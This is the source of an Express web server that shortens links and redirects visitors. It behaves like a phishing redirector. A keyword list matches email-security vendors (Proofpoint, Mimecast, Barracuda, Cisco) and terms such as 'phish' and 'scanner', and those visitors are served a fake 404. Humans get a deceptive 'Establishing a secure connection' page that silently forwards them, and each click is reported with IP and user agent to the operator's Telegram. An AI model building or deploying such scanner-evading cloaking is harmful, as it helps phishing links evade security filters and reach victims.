import express from 'express';
import useragent from 'express-useragent';
import axios from 'axios';
import mongoose from 'mongoose';

const app = express();

// Middleware
app.use(useragent.express());
app.use(express.urlencoded({ extended: true })); // 📝 Parses incoming HTML form submissions

const PORT = process.env.PORT || 3000;

// 📁 Connect to MongoDB
mongoose.connect(process.env.MONGODB_URI)
  .then(() => console.log('📁 Connected to MongoDB successfully!'))
  .catch(err => console.error('❌ MongoDB connection error:', err));

// 📝 Schema definition
const linkSchema = new mongoose.Schema({
    slug: { type: String, required: true, unique: true },
    realUrl: { type: String, required: true },
    clicks: { type: Number, default: 0 }
});

const Link = mongoose.model('Link', linkSchema);

// 🔍 Helper: Check if visitor is a Bot by User-Agent (IP info fetched for logging only)
async function isBotOrProxy(visitorIp, reqUserAgent, rawAgentString = '') {
    const agentLower = rawAgentString.toLowerCase();

    // 1. Fast Check: User-Agent Inspection
    const botKeywords = [
        'bot', 'crawler', 'spider', 'headless', 'python', 'curl', 'wget', 
        'postman', 'comcast', 'proofpoint', 'barracuda', 'cisco', 'mimecast', 
        'phish', 'scanner', 'facebookexternalhit', 'telegrambot', 'twitterbot'
    ];

    if (reqUserAgent.isBot || botKeywords.some(keyword => agentLower.includes(keyword))) {
        return { isBot: true, reason: 'Suspicious User-Agent / Known Crawler' };
    }

    // Handle local IP addresses during development
    if (visitorIp === '127.0.0.1' || visitorIp === '::1' || visitorIp.startsWith('192.168.')) {
        return { isBot: false, reason: 'Local Development Traffic' };
    }

    // 2. Fetch IP Intelligence ONLY for logging
    try {
        const response = await axios.get(`http://ip-api.com/json/${visitorIp}?fields=status,org,isp`, { timeout: 3000 });
        if (response.data && response.data.status === 'success') {
            const { org, isp } = response.data;
            console.log(`ℹ️ Visitor IP Details: ${visitorIp} (${org || isp || 'Unknown Network'})`);
        }
    } catch (error) {
        console.error('IP API lookup failed:', error.message);
    }

    return { isBot: false, reason: 'Human Traffic' };
}

// ✂️ Shorten Link Route
app.get('/shorten', async (req, res) => {
    const slug = req.query.slug;
    const url = req.query.url;

    if (!slug || !url) {
        return res.status(400).send('Error: Please provide both ?slug= and ?url=');
    }

    try {
        await Link.findOneAndUpdate(
            { slug: slug }, 
            { realUrl: url, clicks: 0 }, 
            { upsert: true, new: true }
        );

        const host = req.get('host');
        const protocol = req.protocol;
        
        res.send(`Success! Short link created: ${protocol}://${host}/${slug}`);
    } catch (error) {
        console.error('❌ Error saving link to database:', error);
        res.status(500).send('Internal Server Error');
    }
});

// 🧭 Route 1: Serve Turnstile Verification Page
app.get('/:slug', async (req, res) => {
    const slug = req.params.slug;

    try {
        const linkData = await Link.findOne({ slug: slug });

        if (!linkData) {
            return res.status(404).send('Link not found!');
        }

        // Extract Visitor IP and User-Agent
        const forwardedIps = req.headers['x-forwarded-for'];
        const visitorIp = forwardedIps ? forwardedIps.split(',')[0].trim() : req.socket.remoteAddress;
        const visitorAgent = req.headers['user-agent'] || 'Unknown';

        // 🛡️ Run User-Agent Anti-Bot Check
        const botStatus = await isBotOrProxy(visitorIp, req.useragent, visitorAgent);

        if (botStatus.isBot) {
            console.log(`🤖 BOT BLOCKED [/${slug}]: ${visitorIp} - Reason: ${botStatus.reason}`);
            sendTelegramAlert(slug, visitorIp, visitorAgent, linkData.clicks, true, botStatus.reason);
            return res.status(404).send('Not Found');
        }

        // 📄 Serve Invisible Turnstile Verification Page
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Establishing Secure Connection...</title>
                <!-- Turnstile Script -->
                <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
                <style>
                    /* Minimal reset */
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    
                    body { 
                        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                        display: flex; 
                        justify-content: center; 
                        align-items: center; 
                        height: 100vh; 
                        background-color: #fcfcfd; /* Clean, almost white bg */
                        color: #1a1a1a;
                    }

                    .container { 
                        text-align: center; 
                        padding: 2.5rem; 
                        background: #ffffff; 
                        border-radius: 12px; 
                        box-shadow: 0 10px 25px rgba(0,0,0,0.05); /* Soft, modern shadow */
                        width: 90%;
                        max-width: 400px;
                        overflow: hidden; /* Needed for the bar positioning */
                        position: relative;
                    }

                    /* 🌀 The Blue Loading Bar */
                    .loading-bar-container {
                        position: absolute;
                        top: 0;
                        left: 0;
                        width: 100%;
                        height: 4px; /* Thin bar */
                        background-color: #e0e7ff; /* Lighter blue track */
                    }

                    .loading-bar-progress {
                        height: 100%;
                        width: 50%; /* Starting width */
                        background-color: #4f46e5; /* Main Blue Color (Indigo-ish) */
                        border-radius: 2px;
                        
                        /* Infinite sliding animation */
                        animation: loadingSlide 1.5s infinite ease-in-out; 
                        transform-origin: 0% 50%;
                    }

                    /* Animation Keyframes */
                    @keyframes loadingSlide {
                        0% { transform: translateX(-100%) scaleX(0.5); }
                        50% { transform: translateX(25%) scaleX(0.9); }
                        100% { transform: translateX(200%) scaleX(0.5); }
                    }

                    /* Text Styling */
                    h2 { 
                        font-size: 1.25rem; 
                        font-weight: 600; 
                        margin-top: 1rem; /* Space for the loading bar */
                        letter-spacing: -0.025em;
                        color: #374151;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <!-- The Blue Bar (Top of Container) -->
                    <div class="loading-bar-container">
                        <div class="loading-bar-progress"></div>
                    </div>

                    <!-- Minimal Text -->
                    <h2>Establishing a secure connection...</h2>

                    <!-- Hidden Turnstile Widget (Handles automatic submit) -->
                    <form id="redirect-form" action="/verify" method="POST">
                        <input type="hidden" name="slug" value="${slug}">
                        <div class="cf-turnstile" 
                             data-sitekey="${process.env.TURNSTILE_SITE_KEY}" 
                             data-callback="onTurnstileSuccess"
                             data-size="invisible"></div> <!-- Ensured invisible -->
                    </form>
                </div>

                <script>
                    // Automatic submission remains the same
                    function onTurnstileSuccess(token) {
                        document.getElementById('redirect-form').submit();
                    }
                </script>
            </body>
            </html>
        `);

    } catch (error) {
        console.error('Error handling redirect:', error);
        res.status(500).send('Internal Server Error');
    }
});

// 🛡️ Route 2: Validate Turnstile Token & Execute Redirect
app.post('/verify', async (req, res) => {
    const slug = req.body.slug;
    const token = req.body['cf-turnstile-response'];

    if (!slug || !token) {
        return res.status(400).send('Invalid request or missing verification token.');
    }

    try {
        // Verify response token with Cloudflare API
        const verifyRes = await axios.post('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            secret: process.env.TURNSTILE_SECRET_KEY,
            response: token
        });

        if (!verifyRes.data || !verifyRes.data.success) {
            return res.status(403).send('Verification failed. Please try again.');
        }

        // Find the destination link in DB
        const linkData = await Link.findOne({ slug: slug });
        if (!linkData) {
            return res.status(404).send('Link not found!');
        }

        // 👤 Increment human click counter
        linkData.clicks++;
        await linkData.save();

        // Send Telegram alert
        const forwardedIps = req.headers['x-forwarded-for'];
        const visitorIp = forwardedIps ? forwardedIps.split(',')[0].trim() : req.socket.remoteAddress;
        const visitorAgent = req.headers['user-agent'] || 'Unknown';
        
        sendTelegramAlert(slug, visitorIp, visitorAgent, linkData.clicks, false);

        // 🚀 Redirect to real URL
        return res.redirect(linkData.realUrl);

    } catch (error) {
        console.error('Turnstile verification error:', error.message);
        res.status(500).send('Internal Server Error');
    }
});

// 📢 Telegram Notification Function
async function sendTelegramAlert(slug, visitorIp, visitorAgent, clickCount, isBot = false, botReason = '') {
    const token = process.env.TELEGRAM_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) return;
    
    let message = '';

    if (isBot) {
        message = `🤖 *BOT / SCANNER BLOCKED!*\n\n` +
                  `🔗 *Link:* /${slug}\n` +
                  `🚫 *Reason:* ${botReason}\n` +
                  `🌐 *IP Address:* ${visitorIp}\n` +
                  `📱 *User Agent:* \`${visitorAgent}\``;
    } else {
        message = `🚨 *Link Clicked!*\n\n` +
                  `🔗 *Link:* /${slug}\n` +
                  `🔢 *Total Clicks:* ${clickCount}\n` +
                  `🌐 *IP Address:* ${visitorIp}\n` +
                  `📱 *User Agent:* \`${visitorAgent}\``;
    }

    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    
    try {
        await axios.post(telegramUrl, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (error) {
        console.error('Telegram notification failed:', error.message);
    }
}

// Start Server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});